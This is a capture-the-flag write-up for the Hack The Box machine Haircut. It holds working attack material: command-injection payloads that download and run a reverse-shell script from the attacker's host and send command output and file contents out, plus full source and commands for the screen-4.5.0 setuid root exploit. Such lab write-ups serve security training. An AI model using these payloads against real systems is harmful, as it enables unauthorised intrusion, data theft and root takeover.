# Haircut
>Author : Xyan1d3
>Date : 8th July 2021
>IP : 10.10.10.24
>OS : Linux
>Difficulty : Medium
# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Thu Jul  8 16:10:05 2021 as: nmap -sC -sV -v -oN nmap/haircut 10.10.10.24
Nmap scan report for 10.10.10.24
Host is up (0.069s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e9:75:c1:e4:b3:63:3c:93:f2:c6:18:08:36:48:ce:36 (RSA)
|   256 87:00:ab:a9:8f:6f:4b:ba:fb:c6:7a:55:a8:60:b2:68 (ECDSA)
|_  256 b6:1b:5c:a9:26:5c:dc:61:b7:75:90:6c:88:51:6e:54 (ED25519)
80/tcp open  http    nginx 1.10.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title:  HTB Hairdresser 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Gobuster
```python
┌─[Magisk@Xyan1d3]─[10.10.14.18]─[~/htb/haircut]
└──╼ # gobuster dir -u http://10.10.10.24 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 500 -x php 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.24
[+] Method:                  GET
[+] Threads:                 500
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2021/07/08 21:21:09 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 194] [--> http://10.10.10.24/uploads/]
/exposed.php          (Status: 200) [Size: 446]
```

## Web Enumeration
We have a webpage that take a url link.
![[Pasted image 20210708212813.png]]

We could host listen on `nc` and point it on our server.
![[Pasted image 20210708212925.png]]
The server is using `curl` for sending requests to the server.
We may now try some command injection by bypassing the url checks.
We visit the link and find out that we get the output as get request on the webserver.
```txt
http://10.10.14.18/`whoami`
```
![[Pasted image 20210708230512.png]]

We try for normal bash payloads but, it does not work.So, We use a `base64` command to get the contents of the `exposed.php`.
```txt
http://10.10.14.18/`base64 -w0 exposed.php`
```

# Initial FootHold
On inspecting the file we see that some of the characters are blacklisted out.
We have to `curl` and download a `shell.sh` reverse shell into `/tmp/` directory and then execute it with `sh`.

1st payload : `10.10.14.18/shell.sh -o /tmp/shell.sh`
2nd payload : `10.10.14.18/shell.sh$(sh /tmp/shell.sh)`
We get a shell back as the `www-data` user.
![[Pasted image 20210708235926.png]]

## Getting the User Flag
```python
www-data@haircut:~$ cd /home/maria/Desktop/
www-data@haircut:/home/maria/Desktop$ ls -l
total 4
-r--r--r-- 1 root root 34 May 16  2017 user.txt
www-data@haircut:/home/maria/Desktop$ cat user.txt 
0b0da2af50e9ab7c81a6ec2c562afeae
```

# Root Escalation
We check the setuid binaries on the box and find out that we have a `screen-4.5.0` installed on the box with setuid bit set.
```python
www-data@haircut:~$ find / -perm /4000 2> /dev/null

*** SNIP ***

/usr/bin/at
/usr/bin/passwd
/usr/bin/screen-4.5.0

*** SNIP ***
```

The exploit for `screen-4.5.0` is given below.
![[Pasted image 20210709001207.png]]

We need to compile two codes on our box.
1st Code : `libhax.c`
```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
```
Compile command : `gcc -fPIC -shared -ldl -o libhax.so libhax.c`

2nd Code : `rootshell.c`
```c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
```
Compile Command : `gcc -o rootshell rootshell.c`

Now, We need to move the `rootshell` and `libhax.so` file into the `/tmp/` directory.
And issue these commands as follows.

```python
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
screen -ls
/tmp/rootshell
```
![[Pasted image 20210709003222.png]]

## Getting the Root Flag
```python
root@haircut:/etc# cd /root/
root@haircut:/root# ls -l
total 4
-r--r--r-- 1 root root 33 May 16  2017 root.txt
root@haircut:/root# cat root.txt 
4cfa26d84b2220826a07f0697dc72151
```